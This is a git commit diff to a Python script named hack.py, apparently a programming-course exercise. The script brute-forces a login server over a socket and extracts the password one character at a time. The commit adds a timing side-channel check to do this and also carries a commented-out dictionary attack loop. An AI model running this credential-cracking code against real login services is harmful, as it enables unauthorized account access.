73938f3da904e5e5c44179a49d3620c82680ecee
Evardanyan <64473803+Evardanyan@users.noreply.github.com>
2023-11-29 16:33:00 +0400

    Update hack.py

--- hacking/hack.py
+++ hacking/hack.py
@@ -3,7 +3,7 @@ import socket
 import sys
 import os
 import json
-
+import time
 
 def all_case_combinations(word):
     return map(''.join, itertools.product(*zip(word.upper(), word.lower())))
@@ -50,18 +50,25 @@ def establish_connection():
             break
 
     if len(login) > 0:
+        # print("password part")
+        # client_socket = socket.socket()
+        # client_socket.connect(address)
         possible_characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
         password_so_far = ""
 
         while True:
             found_char = False
+
             for char in possible_characters:
                 current_attempt = password_so_far + char
                 data = {"login": login, "password": current_attempt}
                 json_data = json.dumps(data).encode()
 
+                start_time = time.time()
                 client_socket.send(json_data)
                 response = client_socket.recv(1024)
+                end_time = time.time()
+                response_time = end_time - start_time
                 decoded_response = json.loads(response.decode())
 
                 # we got the password, break the loop
@@ -74,7 +81,12 @@ def establish_connection():
                     exit(0)
 
                 # we found the next character in the password
-                if decoded_response == {"result": "Exception happened during login"}:
+                # if decoded_response == {"result": "Exception happened during login"}:
+                #     password_so_far = current_attempt
+                #     found_char = True
+                #     break
+
+                if response_time >= 0.1:  # Set a threshold for delay
                     password_so_far = current_attempt
                     found_char = True
                     break
@@ -83,6 +95,36 @@ def establish_connection():
             if not found_char:
                 print("Failed to determine the complete password.")
                 exit(1)
+        # # for password_length in range(1, 10):
+        # for password in password_list:
+        #     for guess_password in all_case_combinations(password):
+        #
+        #         data = {"login": login,
+        #                 "password": guess_password
+        #                 }
+        #         json_data = json.dumps(data).encode()
+        #
+        #         client_socket.send(json_data)
+        #         response = client_socket.recv(1024)
+        #         decoded_response = json.loads(response.decode())
+        #
+        #         # we got the password, break the loop
+        #         if decoded_response == {"result": "Connection success!"}:
+        #             print("username and password is :>", json_data)
+        #             client_socket.close()
+        #             break
+        #             exit(0)
+        #
+        #         # we exceed the attempts limit, stop the program
+        #         if decoded_response == {"result": "Exception happened during login"}:
+        #             print("Exception happened during login")
+        #             exit(1)
+        #
+        #         if decoded_response == {"result": "Bad request!"}:
+        #             print("Exception happened during login")
+        #             exit(1)
+        #         print(json_data)
+
 
 establish_connection()
 
